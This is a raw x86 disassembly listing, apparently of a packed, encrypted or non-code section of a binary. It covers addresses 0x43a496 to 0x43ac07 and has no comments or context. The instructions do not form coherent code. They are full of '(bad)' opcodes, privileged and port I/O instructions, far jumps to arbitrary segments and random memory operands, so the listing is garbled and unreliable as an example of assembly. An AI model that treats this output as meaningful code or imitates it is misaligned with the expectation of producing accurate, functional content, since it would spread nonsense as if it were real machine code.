  43a496:	jg     0x43a45d
  43a498:	ds cld 
  43a49a:	xchg   ebx,eax
  43a49b:	sbb    eax,DWORD PTR [edi-0x21]
  43a49e:	pop    edx
  43a49f:	add    BYTE PTR [ebp-0x1f],ch
  43a4a2:	shr    BYTE PTR [eax+0x28],cl
  43a4a5:	inc    edi
  43a4a6:	pop    ds
  43a4a7:	sub    ebx,0x5b7ec970
  43a4ad:	push   ebx
  43a4ae:	mov    al,ds:0xbefe605c
  43a4b3:	xlat   BYTE PTR ds:[ebx]
  43a4b4:	fisub  DWORD PTR [edi-0x5c]
  43a4b7:	xor    DWORD PTR [edx-0x48],ebp
  43a4ba:	sub    al,0x68
  43a4bc:	cmp    BYTE PTR [edi+ecx*8],dh
  43a4bf:	adc    esp,DWORD PTR [ecx+0x7]
  43a4c2:	mov    bh,0xb4
  43a4c4:	cld    
  43a4c5:	daa    
  43a4c6:	or     BYTE PTR [edx],dl
  43a4c8:	(bad)  
  43a4ca:	fidiv  WORD PTR [ebp+0x61]
  43a4cd:	inc    ebx
  43a4ce:	ins    BYTE PTR es:[edi],dx
  43a4cf:	xchg   bh,al
  43a4d1:	inc    ebx
  43a4d2:	in     eax,dx
  43a4d3:	(bad)  [esi+0x73]
  43a4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a4d7:	sub    DWORD PTR [edx-0x2af5f2a4],ebx
  43a4dd:	rol    DWORD PTR [esi-0x778eb36b],1
  43a4e3:	mov    edi,0x5a5a74f8
  43a4e8:	mul    DWORD PTR [edx-0x3f]
  43a4eb:	pop    es
  43a4ec:	pop    ebp
  43a4ed:	(bad)  
  43a4ee:	push   cs
  43a4ef:	or     cl,BYTE PTR [eax]
  43a4f1:	inc    ebp
  43a4f2:	std    
  43a4f3:	add    ch,BYTE PTR [ebp-0x48]
  43a4f6:	ja     0x43a4a2
  43a4f8:	inc    ecx
  43a4f9:	cmp    bl,ch
  43a4fb:	loop   0x43a4da
  43a4fd:	push   0xc6c4772c
  43a502:	and    ecx,esi
  43a504:	(bad)  
  43a505:	mov    bl,0xf4
  43a507:	push   ecx
  43a508:	jae    0x43a56b
  43a50a:	sub    eax,0x8e50822
  43a50f:	inc    ebx
  43a510:	mov    eax,ds:0x3e022ae3
  43a515:	sbb    eax,0x97ebfcc0
  43a51a:	fbld   TBYTE PTR [edi-0x54274a77]
  43a520:	pop    esi
  43a521:	cmp    esi,DWORD PTR [ecx]
  43a523:	push   ecx
  43a524:	jne    0x43a4aa
  43a526:	or     cl,BYTE PTR [edi+0x21252002]
  43a52c:	sbb    eax,0x757c8b40
  43a531:	mov    BYTE PTR ds:0xf2d780cf,dl
  43a537:	sar    DWORD PTR [ebx+0x5f],0x7a
  43a53b:	jl     0x43a4c4
  43a53d:	pop    edx
  43a53e:	imul   edx,edi,0x9797263c
  43a544:	inc    edi
  43a545:	in     eax,0xda
  43a547:	inc    ecx
  43a548:	push   0x67
  43a54a:	xchg   esi,eax
  43a54b:	dec    ebx
  43a54c:	cli    
  43a54d:	adc    DWORD PTR [eax-0x70ef55ab],edi
  43a553:	push   ds
  43a554:	popf   
  43a555:	push   ebp
  43a556:	cmp    esi,DWORD PTR [edx+0x3a8e1d83]
  43a55c:	sub    BYTE PTR gs:0x89e58338,bh
  43a563:	push   ebp
  43a564:	(bad)  
  43a566:	fwait
  43a567:	and    BYTE PTR [esi],0x48
  43a56a:	into   
  43a56b:	mov    eax,ds:0x26671d52
  43a571:	in     al,dx
  43a572:	cdq    
  43a573:	mov    ecx,0x5b2b1d1b
  43a578:	out    0x71,al
  43a57a:	daa    
  43a57b:	repnz or al,0x2f
  43a57e:	inc    esi
  43a57f:	sbb    eax,0x85f46b33
  43a584:	xor    al,0xf2
  43a586:	dec    esi
  43a587:	jbe    0x43a5f1
  43a589:	jnp    0x43a520
  43a58b:	cdq    
  43a58c:	loope  0x43a527
  43a58e:	pop    ds
  43a58f:	pop    ebp
  43a590:	mov    fs,WORD PTR [esi]
  43a592:	call   0x7347d51a
  43a597:	sti    
  43a598:	aam    0xc3
  43a59a:	fcmovnbe st,st(3)
  43a59c:	adc    WORD PTR [ebx+esi*2-0x2d],sp
  43a5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a5a2:	xor    eax,0xe3706e8d
  43a5a7:	outs   dx,DWORD PTR ds:[esi]
  43a5a8:	and    BYTE PTR [esi],ch
  43a5aa:	pop    eax
  43a5ab:	and    eax,0xacceec
  43a5b0:	cs dec eax
  43a5b2:	mov    DWORD PTR [ebx],edx
  43a5b4:	cmp    al,BYTE PTR [eax+0x6e710c1a]
  43a5ba:	and    al,0xbd
  43a5bc:	sar    DWORD PTR gs:[edi],cl
  43a5bf:	sbb    eax,0xdaa51e7c
  43a5c4:	xlat   BYTE PTR ds:[ebx]
  43a5c5:	jno    0x43a5ed
  43a5c7:	pop    edi
  43a5c8:	dec    esi
  43a5c9:	sub    bl,BYTE PTR [esi+0x56771a29]
  43a5cf:	test   DWORD PTR [esi+0x4f62ec46],esi
  43a5d5:	test   DWORD PTR ds:0x5c1aa526,eax
  43a5db:	xor    eax,0x52450a42
  43a5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a5e1:	jmp    0x1e18:0xf9493cd3
  43a5e8:	push   esp
  43a5e9:	cmp    ecx,ebp
  43a5eb:	lahf   
  43a5ec:	fwait
  43a5ed:	mov    al,0xd4
  43a5ef:	lea    esp,[edi]
  43a5f1:	push   0x79
  43a5f3:	and    BYTE PTR [esi],al
  43a5f5:	pop    eax
  43a5f6:	scas   al,BYTE PTR es:[edi]
  43a5f7:	repz bound esi,QWORD PTR [esi]
  43a5fa:	xor    al,0xce
  43a5fc:	push   es
  43a5fd:	(bad)  
  43a5fe:	mov    ecx,0xe152a0e5
  43a603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a604:	mov    eax,ds:0xef8ceefc
  43a609:	pop    esp
  43a60a:	pop    edx
  43a60b:	inc    edi
  43a60c:	lods   eax,DWORD PTR ds:[esi]
  43a60d:	loop   0x43a5ad
  43a60f:	jbe    0x43a66a
  43a611:	fild   QWORD PTR [edx+ebp*8-0x1a]
  43a615:	mov    eax,0x17858dc2
  43a61a:	inc    ecx
  43a61b:	ja     0x43a605
  43a61d:	and    BYTE PTR [edi+0x2e],bh
  43a620:	call   0xcad3:0xb26b84c9
  43a627:	mov    cl,0x8a
  43a629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a62a:	(bad)  ds:0x6001f50a
  43a630:	or     BYTE PTR [eax+0x55],ch
  43a633:	dec    ebx
  43a634:	test   BYTE PTR [ebx+0x2fcec168],0x9b
  43a63b:	je     0x43a609
  43a63d:	mov    ebx,0x449f501a
  43a642:	push   cs
  43a643:	push   0xfffffff3
  43a645:	or     BYTE PTR [ebp+0x5a],bl
  43a648:	push   0xcb62d32a
  43a64d:	pop    edx
  43a64e:	xchg   DWORD PTR [edi+0x31377805],ecx
  43a654:	pop    eax
  43a655:	xchg   esi,eax
  43a656:	imul   ebp,DWORD PTR [eax-0x101cdf88],0xfffffffc
  43a65d:	imul   esp,DWORD PTR [edx],0xffffffa6
  43a660:	test   dh,cl
  43a662:	dec    ebp
  43a663:	sub    ecx,DWORD PTR [ebp+ebx*4-0x58]
  43a667:	xchg   ecx,eax
  43a668:	(bad)  
  43a669:	loope  0x43a681
  43a66b:	jge    0x43a6d5
  43a66d:	shr    bl,0xfc
  43a670:	retf   0x854b
  43a673:	inc    edx
  43a674:	add    eax,0x3903f202
  43a679:	lock fs in eax,dx
  43a67c:	xor    al,BYTE PTR [edi+0x7d]
  43a67f:	pop    es
  43a680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a681:	bound  edx,QWORD PTR ds:0x3dac84f0
  43a687:	jb     0x43a6e5
  43a689:	pop    es
  43a68a:	clc    
  43a68b:	test   DWORD PTR [edx-0x53e83632],eax
  43a691:	push   esp
  43a692:	pop    es
  43a693:	hlt    
  43a694:	ret    0xb9f2
  43a697:	and    DWORD PTR gs:[ebx],esp
  43a69a:	and    DWORD PTR [edx+0x6c986546],ebx
  43a6a0:	or     eax,esi
  43a6a2:	mov    eax,ds:0x62245b5
  43a6a7:	(bad)  
  43a6a8:	mov    ecx,DWORD PTR [ecx]
  43a6aa:	or     al,0x27
  43a6ac:	pop    ds
  43a6ad:	fisttp DWORD PTR [ebx+0xe]
  43a6b0:	pop    ecx
  43a6b1:	rcr    DWORD PTR [ebx-0x33d1a431],1
  43a6b7:	jns    0x43a6a0
  43a6b9:	xor    eax,0xcaf3261e
  43a6bf:	in     al,dx
  43a6c0:	push   esp
  43a6c1:	std    
  43a6c2:	jno    0x43a683
  43a6c4:	jnp    0x43a700
  43a6c6:	cmp    DWORD PTR es:[edi-0x6c],eax
  43a6ca:	sub    DWORD PTR [ecx-0xf91ca86],ebp
  43a6d0:	rcr    ebx,0x95
  43a6d3:	pop    ecx
  43a6d4:	sbb    BYTE PTR [ebx-0x66],ah
  43a6d7:	arpl   bp,di
  43a6d9:	jnp    0x43a6d4
  43a6db:	pop    ds
  43a6dc:	aam    0x37
  43a6de:	sar    BYTE PTR [ecx+0x1b8a9e77],0xab
  43a6e5:	gs xchg ebx,eax
  43a6e7:	sub    DWORD PTR [eax+0x5c67c6cc],0x45aa1099
  43a6f1:	fdiv   DWORD PTR [esi]
  43a6f3:	xor    DWORD PTR [ecx-0x5252eee2],esi
  43a6f9:	test   al,0xa6
  43a6fb:	ja     0x43a761
  43a6fd:	sbb    eax,0x1b9a9f53
  43a702:	fs pop edi
  43a704:	sti    
  43a705:	lock (bad) 
  43a708:	mov    cl,bl
  43a70a:	sub    eax,0xb8c2c13b
  43a70f:	mov    eax,0xe9b0f272
  43a714:	aam    0x41
  43a716:	mov    edi,0x92175fc4
  43a71b:	adc    eax,0xfdc6821b
  43a720:	xlat   BYTE PTR ds:[ebx]
  43a721:	neg    ebp
  43a723:	dec    edx
  43a724:	rol    DWORD PTR cs:[edx+0x7b51051f],cl
  43a72b:	pop    es
  43a72c:	cmp    esi,ebp
  43a72e:	aaa    
  43a72f:	idiv   eax
  43a731:	std    
  43a732:	mov    BYTE PTR [ecx+0x1b],bh
  43a735:	adc    BYTE PTR [esp+eiz*4-0x233ec69c],al
  43a73c:	aad    0x11
  43a73e:	test   BYTE PTR [edi+ebp*1+0x6b],ah
  43a742:	dec    ebx
  43a743:	push   edx
  43a744:	daa    
  43a745:	iret   
  43a746:	sub    ch,BYTE PTR [esi-0x20]
  43a749:	enter  0x3378,0x7f
  43a74d:	jg     0x43a7c6
  43a74f:	sub    dl,BYTE PTR [ecx-0x7d9d286]
  43a755:	push   edx
  43a756:	pop    ebp
  43a757:	or     edi,DWORD PTR [edi]
  43a759:	inc    edx
  43a75a:	and    eax,0xf48f4c3e
  43a75f:	in     al,0x6e
  43a761:	mov    ch,0x75
  43a763:	hlt    
  43a764:	inc    eax
  43a765:	mov    WORD PTR [edx+0x38521edd],cs
  43a76b:	fidivr WORD PTR [edx]
  43a76d:	stc    
  43a76e:	in     eax,dx
  43a76f:	cmp    dl,BYTE PTR [ebx+eax*4]
  43a772:	push   ds
  43a773:	repnz push esp
  43a775:	retf   0x44ce
  43a778:	or     ch,BYTE PTR [edx-0x79]
  43a77b:	add    al,0x61
  43a77d:	nop
  43a77e:	mov    ebp,0x3b842d06
  43a783:	cwde   
  43a784:	(bad)  
  43a785:	ror    BYTE PTR [ebx+eax*4],cl
  43a788:	test   edx,ebx
  43a78a:	cmp    edx,eax
  43a78c:	mov    edx,0x510be62a
  43a791:	std    
  43a792:	pushf  
  43a793:	rep outs dx,DWORD PTR ds:[esi]
  43a795:	or     al,0x8b
  43a797:	jge    0x43a75c
  43a799:	lods   al,BYTE PTR ds:[esi]
  43a79a:	jmp    0x3cc0e2a
  43a79f:	retf   
  43a7a0:	dec    ecx
  43a7a1:	pop    ss
  43a7a2:	mov    DWORD PTR [eax+esi*1],ebx
  43a7a5:	xor    DWORD PTR ds:0x90b21f35,ecx
  43a7ab:	add    cl,ch
  43a7ad:	or     dl,ch
  43a7af:	pop    ds
  43a7b0:	sar    dh,0x45
  43a7b3:	sbb    bh,bh
  43a7b5:	out    0xe9,eax
  43a7b7:	aaa    
  43a7b8:	mov    al,ds:0x708c62f4
  43a7bd:	lock add ecx,ebx
  43a7c0:	or     eax,0x6cdc9674
  43a7c5:	fst    QWORD PTR [ecx+ebx*8-0x1b]
  43a7c9:	add    al,0x90
  43a7cb:	(bad)  
  43a7cc:	data16 mov dl,0x8d
  43a7cf:	jmp    0xfaa2d2ea
  43a7d4:	mov    ds:0x6b9ebae8,al
  43a7d9:	sub    dl,bl
  43a7db:	xchg   BYTE PTR [ecx],dh
  43a7dd:	mov    ch,0x6e
  43a7df:	mov    edx,0xa059ea20
  43a7e4:	jmp    0x43a801
  43a7e6:	or     BYTE PTR [edx-0x4bb6135b],0xa5
  43a7ed:	pop    ecx
  43a7ee:	sub    cl,BYTE PTR [ebp+0x67]
  43a7f1:	dec    ecx
  43a7f2:	aad    0xdd
  43a7f4:	call   0x3a8f:0x2390542c
  43a7fb:	push   eax
  43a7fc:	jl     0x43a806
  43a7fe:	push   ds
  43a7ff:	sbb    bl,ch
  43a801:	dec    ebx
  43a802:	scas   al,BYTE PTR es:[edi]
  43a803:	dec    esi
  43a804:	xlat   BYTE PTR ds:[ebx]
  43a805:	fadd   st,st(2)
  43a807:	cld    
  43a808:	push   eax
  43a809:	add    ch,BYTE PTR [ebp-0x71]
  43a80c:	xchg   esi,eax
  43a80d:	jb     0x43a7a2
  43a80f:	ret    0xfd4e
  43a812:	enter  0xae81,0xda
  43a816:	imul   esi,edi,0x406bbf78
  43a81c:	shl    eax,cl
  43a81e:	xchg   ebx,eax
  43a81f:	jb     0x43a83c
  43a821:	nop
  43a822:	icebp  
  43a823:	icebp  
  43a824:	les    ebp,FWORD PTR [ebx+0x54]
  43a827:	adc    dh,BYTE PTR [eax]
  43a829:	jae    0x43a850
  43a82b:	sub    edi,DWORD PTR [edx+0x558cc743]
  43a831:	sub    al,0xd8
  43a833:	jns    0x43a843
  43a835:	jp     0x43a816
  43a837:	test   BYTE PTR [esi],0x67
  43a83a:	pop    ebp
  43a83b:	mov    al,0x55
  43a83d:	shl    bl,cl
  43a83f:	test   eax,0x606d500f
  43a844:	pop    ecx
  43a845:	xchg   edi,eax
  43a846:	sahf   
  43a847:	sub    al,0x1
  43a849:	cmp    al,0x9
  43a84b:	and    ebx,DWORD PTR [esi+ebx*2+0x4612229d]
  43a852:	pop    es
  43a853:	lods   al,BYTE PTR ds:[esi]
  43a854:	inc    ebp
  43a855:	push   0x5
  43a857:	mov    eax,0x660efd12
  43a85c:	jo     0x43a80e
  43a85e:	cmc    
  43a85f:	jo     0x43a8b8
  43a861:	mov    esi,0xe83d8854
  43a866:	mov    eax,0xca66c6d4
  43a86b:	xor    DWORD PTR [ebp+0x500ac1bb],esp
  43a871:	repz clc 
  43a873:	repnz or esp,DWORD PTR [ebx+0x28]
  43a877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a878:	cmp    al,0x7f
  43a87a:	loopne 0x43a893
  43a87c:	mov    al,0xb4
  43a87e:	mov    ecx,0x4651a359
  43a883:	dec    ecx
  43a884:	inc    ecx
  43a885:	stos   DWORD PTR es:[edi],eax
  43a886:	scas   al,BYTE PTR es:[edi]
  43a887:	dec    esi
  43a888:	(bad)  
  43a889:	xchg   esi,eax
  43a88a:	test   al,0xc5
  43a88c:	push   ds
  43a88d:	and    dh,BYTE PTR [ebx]
  43a88f:	cld    
  43a890:	add    BYTE PTR [ebx-0x10],bh
  43a893:	pop    ss
  43a894:	add    bh,bh
  43a896:	dec    esp
  43a897:	xor    bl,BYTE PTR [esi-0x36]
  43a89a:	call   0xf398:0xb57efef
  43a8a1:	mov    eax,ds:0xf2e52ea8
  43a8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a8a7:	sbb    BYTE PTR [esi+0x2b90f8dd],al
  43a8ad:	pushf  
  43a8ae:	mov    esi,0x49f35b7a
  43a8b3:	mov    DWORD PTR [ebx+0x1c],ebx
  43a8b6:	and    DWORD PTR [edi+edx*2+0x2d],0x5ec498ec
  43a8be:	addr16 aad 0xa9
  43a8c1:	mov    cl,0xa2
  43a8c3:	rcl    DWORD PTR [ecx],0x7d
  43a8c6:	mov    eax,0x6d39b3aa
  43a8cb:	pop    esp
  43a8cc:	adc    esi,DWORD PTR [ebx+0x478eefc6]
  43a8d2:	inc    esp
  43a8d3:	push   esi
  43a8d4:	cmp    esi,esp
  43a8d6:	add    ebp,DWORD PTR [ebp-0x1eb1309c]
  43a8dc:	ss arpl si,bp
  43a8df:	je     0x43a8d8
  43a8e1:	js     0x43a8a2
  43a8e3:	jp     0x43a8b9
  43a8e5:	mov    ebx,0x7e20de44
  43a8ea:	xor    BYTE PTR [ebx],bl
  43a8ec:	jae    0x43a8be
  43a8ee:	sahf   
  43a8ef:	dec    esi
  43a8f0:	mov    ch,0x1d
  43a8f2:	mov    edx,0xa519d120
  43a8f7:	(bad)  
  43a8f8:	lahf   
  43a8f9:	mov    esi,0x4fe2a9b3
  43a8fe:	and    dl,BYTE PTR [edi-0x6ce86568]
  43a904:	cld    
  43a905:	jae    0x43a8e0
  43a907:	inc    ebp
  43a908:	and    eax,0x35dd78aa
  43a90d:	push   ebp
  43a90e:	enter  0x4574,0x2e
  43a912:	mov    al,ds:0xb93bd9bd
  43a917:	inc    esi
  43a918:	aam    0xc3
  43a91a:	sahf   
  43a91b:	les    edx,FWORD PTR [edi]
  43a91d:	add    BYTE PTR [esi-0x1a],bl
  43a920:	popa   
  43a921:	outs   dx,BYTE PTR ds:[esi]
  43a922:	mov    ebp,0xb6d9a821
  43a927:	add    ebx,eax
  43a929:	iret   
  43a92a:	sti    
  43a92b:	add    edi,DWORD PTR [esi+0x20]
  43a92e:	adc    al,BYTE PTR [edx+0x7c]
  43a931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a932:	xchg   BYTE PTR [eax-0x18],ah
  43a935:	mov    cl,0xeb
  43a937:	add    eax,0x1563a923
  43a93c:	in     al,0xf8
  43a93e:	retf   0x3a39
  43a941:	adc    BYTE PTR [ebp-0x4e4bb5b],bl
  43a947:	popf   
  43a948:	cmp    ebp,DWORD PTR [ebp-0x1d696c2a]
  43a94e:	sbb    eax,DWORD PTR [edi]
  43a950:	cli    
  43a951:	jp     0x43a904
  43a953:	xor    eax,0x276568e4
  43a958:	push   edi
  43a959:	push   ss
  43a95a:	mov    dh,0x65
  43a95c:	jmp    0x20fd5159
  43a961:	stos   DWORD PTR es:[edi],eax
  43a962:	add    BYTE PTR [edx+0x16],0x7c
  43a966:	scas   eax,DWORD PTR es:[edi]
  43a967:	jl     0x43a9c3
  43a969:	xchg   ebp,eax
  43a96a:	push   ecx
  43a96b:	add    ebx,DWORD PTR [eax-0x25]
  43a96e:	retf   
  43a96f:	xchg   BYTE PTR [edx+edi*1],ch
  43a972:	fild   QWORD PTR [eax+0x1345d3ac]
  43a978:	(bad)  
  43a979:	rol    DWORD PTR [ecx-0x7d],1
  43a97c:	or     bl,BYTE PTR ds:0x2410037b
  43a982:	dec    edi
  43a983:	inc    ebp
  43a984:	add    DWORD PTR [ebx+eiz*8],ebx
  43a987:	xrelease xchg DWORD PTR ds:0x5a89de94,esp
  43a98e:	fwait
  43a98f:	js     0x43aa0b
  43a991:	fild   DWORD PTR [ebp+0x234c90c1]
  43a997:	hlt    
  43a998:	push   esp
  43a999:	xchg   esi,eax
  43a99a:	loop   0x43a931
  43a99c:	mov    dh,0xdd
  43a99e:	loope  0x43a9d4
  43a9a0:	loope  0x43a9e6
  43a9a2:	pop    eax
  43a9a3:	sbb    eax,0x3abdb10b
  43a9a8:	loope  0x43a9c0
  43a9aa:	gs mov cl,0x2e
  43a9ad:	and    ecx,eax
  43a9af:	in     al,0x8
  43a9b1:	sub    al,0x65
  43a9b3:	into   
  43a9b4:	hlt    
  43a9b5:	pushf  
  43a9b6:	cmp    eax,DWORD PTR [esi+0x2db4bf36]
  43a9bc:	clc    
  43a9bd:	mov    ebp,ss
  43a9bf:	mov    ecx,0x8198f3c1
  43a9c4:	in     al,0x94
  43a9c6:	dec    edx
  43a9c7:	or     eax,0xc4087da0
  43a9cc:	fcmovnbe st,st(5)
  43a9ce:	adc    DWORD PTR [edx],edx
  43a9d0:	sar    bl,cl
  43a9d2:	dec    esi
  43a9d3:	lods   al,BYTE PTR cs:[esi]
  43a9d5:	das    
  43a9d6:	inc    esi
  43a9d7:	jno    0x43a9fa
  43a9d9:	fnstsw WORD PTR [edi+0x74]
  43a9dc:	mov    ds:0x3d0ecacc,al
  43a9e1:	pop    ds
  43a9e2:	mov    dh,0xbd
  43a9e4:	jmp    0x409:0x65757922
  43a9eb:	cmp    eax,0xfeb6ab6b
  43a9f0:	shr    DWORD PTR [ecx+0x37b1073a],cl
  43a9f6:	inc    ebx
  43a9f7:	outs   dx,BYTE PTR ds:[esi]
  43a9f8:	imul   ecx,ebp,0x29c02d92
  43a9fe:	rol    cl,cl
  43aa00:	lds    ebx,FWORD PTR [edi]
  43aa02:	fwait
  43aa03:	shl    DWORD PTR [edi],1
  43aa05:	xchg   ecx,eax
  43aa06:	ret    
  43aa07:	call   0x62c3370f
  43aa0c:	and    eax,0x90f43fbd
  43aa11:	ret    
  43aa12:	dec    eax
  43aa13:	retf   0xe30b
  43aa16:	scas   al,BYTE PTR es:[edi]
  43aa17:	xchg   edx,eax
  43aa18:	pop    es
  43aa19:	mov    edx,ds
  43aa1b:	bound  ebx,QWORD PTR [edi]
  43aa1d:	fs aas 
  43aa1f:	ret    0x56b4
  43aa22:	inc    ecx
  43aa23:	inc    ebx
  43aa24:	xchg   ecx,eax
  43aa25:	mov    ebp,0xed3aabec
  43aa2a:	in     eax,0x81
  43aa2c:	adc    ecx,DWORD PTR [eax]
  43aa2e:	xchg   DWORD PTR [edx+edi*2+0x5e03be39],eax
  43aa35:	je     0x43aa38
  43aa37:	and    DWORD PTR [ebp+0x302ae5db],eax
  43aa3d:	cdq    
  43aa3e:	ja     0x43aab7
  43aa40:	arpl   WORD PTR ds:0xb1ff948d,cx
  43aa46:	xchg   ebx,eax
  43aa47:	addr16 int3 
  43aa49:	fnstcw WORD PTR [edx]
  43aa4b:	retf   
  43aa4c:	jo     0x43aa76
  43aa4e:	jge    0x43aaa3
  43aa50:	jns    0x43a9e2
  43aa52:	sbb    BYTE PTR [edi+0x50],bl
  43aa55:	push   ds
  43aa56:	out    dx,eax
  43aa57:	lds    eax,FWORD PTR [esi]
  43aa59:	(bad)  
  43aa5a:	xchg   ecx,eax
  43aa5b:	and    DWORD PTR [eax+0x10b4cbab],ebx
  43aa61:	sar    DWORD PTR [ecx+0x79c211be],cl
  43aa67:	mov    edx,?
  43aa69:	mov    ds:0xe759d4c8,eax
  43aa6e:	cmp    al,BYTE PTR [edx]
  43aa70:	adc    edx,DWORD PTR ds:0xd1d70e3
  43aa76:	adc    ebp,DWORD PTR [eax-0x54bbb43b]
  43aa7c:	cld    
  43aa7d:	push   ss
  43aa7e:	sbb    eax,0x57670cfc
  43aa83:	les    ebx,FWORD PTR [edi+0x59]
  43aa86:	leave  
  43aa87:	add    DWORD PTR [edx-0x7e9ef95c],0x5182c7af
  43aa91:	lods   al,BYTE PTR ds:[esi]
  43aa92:	inc    esp
  43aa93:	shl    dl,1
  43aa95:	stos   DWORD PTR es:[edi],eax
  43aa96:	jns    0x43aa99
  43aa98:	imul   DWORD PTR ds:0xabde1f97
  43aa9e:	push   ecx
  43aa9f:	fdiv   QWORD PTR [eax-0x2a]
  43aaa2:	mov    bl,0xb9
  43aaa4:	data16 daa 
  43aaa6:	pop    ecx
  43aaa7:	push   cs
  43aaa8:	jb     0x43ab23
  43aaaa:	test   BYTE PTR cs:[eax],bl
  43aaad:	push   ss
  43aaae:	test   eax,0x50f1914b
  43aab3:	loopne 0x43aa5b
  43aab5:	loopne 0x43aad5
  43aab7:	(bad)  [ecx-0x4b]
  43aaba:	mov    cs,edi
  43aabc:	cs sub ecx,ebx
  43aabf:	jg     0x43aa49
  43aac1:	ja     0x43aadf
  43aac3:	jmp    0xcbb320de
  43aac8:	repnz in eax,dx
  43aaca:	or     al,0x6c
  43aacc:	xchg   ecx,eax
  43aacd:	fisubr DWORD PTR [edi]
  43aacf:	neg    DWORD PTR [eax-0x384e2f12]
  43aad5:	sub    DWORD PTR [eax],esp
  43aad7:	(bad)  
  43aad9:	cmp    ch,BYTE PTR [ebp+0x6ce709b7]
  43aadf:	repz inc ecx
  43aae1:	add    al,bl
  43aae3:	push   ebp
  43aae4:	add    al,cl
  43aae6:	jae    0x43ab2d
  43aae8:	dec    esi
  43aae9:	shr    DWORD PTR [edi+0x41],cl
  43aaec:	mov    dl,0x4a
  43aaee:	sbb    al,0xd2
  43aaf0:	das    
  43aaf1:	jl     0x43aa9a
  43aaf3:	icebp  
  43aaf4:	aaa    
  43aaf5:	adc    al,0xf
  43aaf7:	enter  0x1989,0xe6
  43aafb:	ins    DWORD PTR es:[edi],dx
  43aafc:	push   ecx
  43aafd:	pusha  
  43aafe:	mov    edi,0x4ad93310
  43ab03:	inc    esi
  43ab04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab05:	pop    eax
  43ab06:	inc    ecx
  43ab07:	(bad)  
  43ab09:	jnp    0x43ab47
  43ab0b:	mov    esp,DWORD PTR [esi+0x5b3b7cb8]
  43ab11:	inc    edx
  43ab12:	outs   dx,DWORD PTR ds:[esi]
  43ab13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab14:	int3   
  43ab15:	jmp    0xc679:0xb54f4837
  43ab1c:	sub    BYTE PTR ss:[eax+0x6c998e71],bh
  43ab23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ab25:	xchg   DWORD PTR [edi+0x51],edx
  43ab28:	popf   
  43ab29:	pop    edx
  43ab2a:	int    0x68
  43ab2c:	rcr    dh,1
  43ab2e:	jno    0x43aae5
  43ab30:	scas   eax,DWORD PTR es:[edi]
  43ab31:	mov    ebp,0x897ba4b7
  43ab36:	mov    esp,0xb450ee46
  43ab3b:	cmp    al,0xb8
  43ab3d:	rol    BYTE PTR [ecx-0x5904a4d6],cl
  43ab43:	mov    edx,ebx
  43ab45:	adc    dl,BYTE PTR [edx-0x44fa9d39]
  43ab4b:	lock jg 0x43abb7
  43ab4e:	jmp    0x1854:0xa89853c7
  43ab55:	and    DWORD PTR [eax+0x41],ebx
  43ab58:	add    esp,edi
  43ab5a:	cli    
  43ab5b:	push   esp
  43ab5c:	xor    DWORD PTR [ebx+0x4c],eax
  43ab5f:	mov    al,0x37
  43ab61:	ds leave 
  43ab63:	cmp    eax,0x6f252612
  43ab68:	push   0xfdae0a18
  43ab6d:	outs   dx,BYTE PTR ds:[esi]
  43ab6e:	pop    ebp
  43ab6f:	repnz push ebx
  43ab71:	arpl   WORD PTR [edi+0x4d],si
  43ab74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab75:	dec    ebp
  43ab76:	es xor al,0xd4
  43ab79:	test   edx,esp
  43ab7b:	mov    ebp,0xce2e1ff3
  43ab80:	push   0x2da4f311
  43ab85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ab86:	pop    edx
  43ab87:	gs (bad) 
  43ab89:	xchg   ebp,eax
  43ab8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab8b:	gs repz inc ebx
  43ab8e:	ror    DWORD PTR [ecx+ebp*4+0x3e350ce8],1
  43ab95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab96:	scas   al,BYTE PTR es:[edi]
  43ab97:	enter  0x5a87,0xe
  43ab9b:	(bad)  
  43ab9d:	inc    ebp
  43ab9e:	adc    BYTE PTR [ebp-0x5b],0x95
  43aba2:	scas   eax,DWORD PTR es:[edi]
  43aba3:	scas   eax,DWORD PTR es:[edi]
  43aba4:	jbe    0x43ab8e
  43aba6:	mov    gs,esi
  43aba8:	popa   
  43aba9:	aam    0xf9
  43abab:	ror    BYTE PTR [ebp-0x410af6ac],0x5c
  43abb2:	outs   dx,DWORD PTR ds:[esi]
  43abb3:	sbb    BYTE PTR ds:0x41fa6884,ah
  43abb9:	inc    esp
  43abba:	xchg   DWORD PTR [edi],ebx
  43abbc:	out    0x15,eax
  43abbe:	pop    edx
  43abbf:	adc    esp,DWORD PTR [ebx+0x34]
  43abc2:	fst    QWORD PTR [edx+0x177cea93]
  43abc8:	mov    ch,BYTE PTR [eax]
  43abca:	add    ebx,DWORD PTR [ebx+eax*8]
  43abcd:	push   ebx
  43abcf:	rcl    DWORD PTR [ecx-0x7d],0xe0
  43abd3:	sbb    al,0xf4
  43abd5:	call   0x74afc653
  43abda:	(bad)  
  43abdc:	pop    esp
  43abdd:	popf   
  43abde:	xlat   BYTE PTR ds:[ebx]
  43abdf:	xchg   DWORD PTR [ecx],ebx
  43abe1:	(bad)  
  43abe2:	sar    cl,0xa
  43abe5:	cwde   
  43abe6:	rol    BYTE PTR [edx],0x1d
  43abe9:	push   0x5013833f
  43abee:	ja     0x43ab73
  43abf0:	or     bh,BYTE PTR [eax-0x1d]
  43abf3:	mov    eax,0x6fc5a10b
  43abf8:	jns    0x43abc2
  43abfa:	pop    eax
  43abfb:	mov    ch,0xd
  43abfd:	push   ebp
  43abfe:	cmp    DWORD PTR [eax-0x19],eax
  43ac01:	or     eax,0xb599c8dc
  43ac06:	outs   dx,DWORD PTR ds:[esi]
  43ac07:	push   0x5
